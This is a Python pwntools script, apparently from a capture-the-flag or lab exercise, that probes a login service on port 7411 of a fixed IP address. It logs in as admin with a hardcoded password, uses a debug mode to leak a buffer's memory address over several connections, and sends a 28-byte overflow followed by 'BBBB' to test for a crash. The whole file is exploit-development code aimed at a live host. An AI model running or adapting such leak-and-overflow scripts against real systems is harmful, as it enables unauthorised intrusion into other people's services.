#!/usr/bin/env python3
"""diag2.py - check address stability + full response dump."""
import sys
import time
from pwn import *  # noqa: F403

context.update(arch="i386", os="linux", log_level="error")
HOST = sys.argv[1] if len(sys.argv) > 1 else "10.129.63.36"

# Connection A: leak
c = remote(HOST, 7411, timeout=10)
c.recvuntil(b"Send USER command.")
c.sendline(b"DEBUG")
c.recvuntil(b"DEBUG mode on.")
c.sendline(b"USER admin")
c.recvuntil(b"Send PASS command.")
c.sendline(b"PASS 1974jailbreak!")
c.recvuntil(b"userpass buffer @ ")
leak = int(c.recvline().strip(), 16)
c.close()
print(f"conn A leak: 0x{leak:08x}")

# Connection B: same but with DEBUG so we see its own address
c = remote(HOST, 7411, timeout=10)
c.recvuntil(b"Send USER command.")
c.sendline(b"DEBUG")
c.recvuntil(b"DEBUG mode on.")
c.sendline(b"USER admin")
c.recvuntil(b"Send PASS command.")
# overflow with 28 A + BBBB (test crash first)
c.sendline(b"PASS " + b"A" * 28 + b"BBBB")
time.sleep(1)
try:
    out = c.recv(timeout=4)
    print("conn B recv:", repr(out))
except Exception as e:
    print("conn B recv err:", e)
c.close()
print("conn B closed")

# Connection C: leak again to see if it drifts over time
c = remote(HOST, 7411, timeout=10)
c.recvuntil(b"Send USER command.")
c.sendline(b"DEBUG")
c.recvuntil(b"DEBUG mode on.")
c.sendline(b"USER admin")
c.recvuntil(b"Send PASS command.")
c.sendline(b"PASS 1974jailbreak!")
c.recvuntil(b"userpass buffer @ ")
leak2 = int(c.recvline().strip(), 16)
c.close()
print(f"conn C leak: 0x{leak2:08x}")
